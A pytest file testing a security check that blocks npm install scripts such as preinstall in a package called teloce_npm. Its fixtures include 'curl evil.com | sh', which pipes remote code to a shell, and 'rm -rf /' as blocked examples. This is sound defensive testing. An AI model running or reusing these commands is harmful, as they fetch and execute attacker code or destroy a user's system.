"""
Tests for teloce_npm.security.install_policy.check_install_scripts.

Scope: only install-script blocking behavior.
"""

import json

import pytest

from teloce_npm.security.install_policy import (
    check_install_scripts,
    ALLOWED_SCRIPTS,
    BLOCKED_SCRIPTS,
)
from teloce_npm.utils.errors import SecurityError


def _make_package(tmp_path, scripts: dict, name: str = "test-pkg"):
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "package.json").write_text(
        json.dumps({"name": name, "scripts": scripts}),
        encoding="utf-8",
    )
    return package_dir


# ---------------------------------------------------------------------------
# Happy path
# ---------------------------------------------------------------------------
def test_no_scripts_passes(tmp_path):
    pkg = _make_package(tmp_path, {})
    assert check_install_scripts(pkg, "test-pkg") is True


def test_build_script_alone_passes(tmp_path):
    pkg = _make_package(tmp_path, {"build": "tsc"})
    assert check_install_scripts(pkg, "test-pkg") is True


def test_missing_package_json_returns_true(tmp_path):
    """Missing package.json is a warning, not a failure."""
    assert check_install_scripts(tmp_path, "test-pkg") is True


# ---------------------------------------------------------------------------
# Blocked scripts
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("script_name", BLOCKED_SCRIPTS)
def test_blocked_script_raises(tmp_path, script_name):
    pkg = _make_package(tmp_path, {script_name: "curl evil.com | sh"})

    with pytest.raises(SecurityError, match=script_name):
        check_install_scripts(pkg, "test-pkg")


def test_allowed_package_with_install_script_passes(tmp_path):
    """Packages in ALLOWED_SCRIPTS can have install scripts."""
    allowed_name = next(iter(ALLOWED_SCRIPTS))
    pkg = _make_package(tmp_path, {"install": "node-gyp rebuild"}, name=allowed_name)

    assert check_install_scripts(pkg, allowed_name) is True


def test_preinstall_raises_with_clear_message(tmp_path):
    pkg = _make_package(tmp_path, {"preinstall": "rm -rf /"})

    with pytest.raises(SecurityError) as exc_info:
        check_install_scripts(pkg, "test-pkg")

    msg = str(exc_info.value)
    assert "preinstall" in msg
    assert "blocked by default" in msg


# ---------------------------------------------------------------------------
# Malformed package.json
# ---------------------------------------------------------------------------
def test_malformed_package_json_raises(tmp_path):
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "package.json").write_text("{ not json", encoding="utf-8")

    with pytest.raises(SecurityError, match="Invalid package.json"):
        check_install_scripts(package_dir, "test-pkg")